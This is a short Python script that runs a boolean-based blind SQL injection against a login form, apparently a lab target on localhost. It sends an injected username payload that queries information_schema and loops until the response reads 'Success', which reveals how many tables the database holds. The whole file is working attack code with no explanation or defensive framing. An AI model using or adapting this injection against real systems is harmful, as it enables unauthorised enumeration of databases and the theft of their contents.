import requests;

def getNumberOfTables():

    payload={
        "username":"",
        "password":""
    }
    status = "";
    numberOfTables = 0;

    while(status != "Success"):
        payload["username"] = "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = {}-- ".format(numberOfTables);
        r = requests.post("http://localhost:8888/", data = payload);
        status = r.content.decode("utf-8");
        numberOfTables += 1;

    print("Number of tables: " + str(numberOfTables - 1));
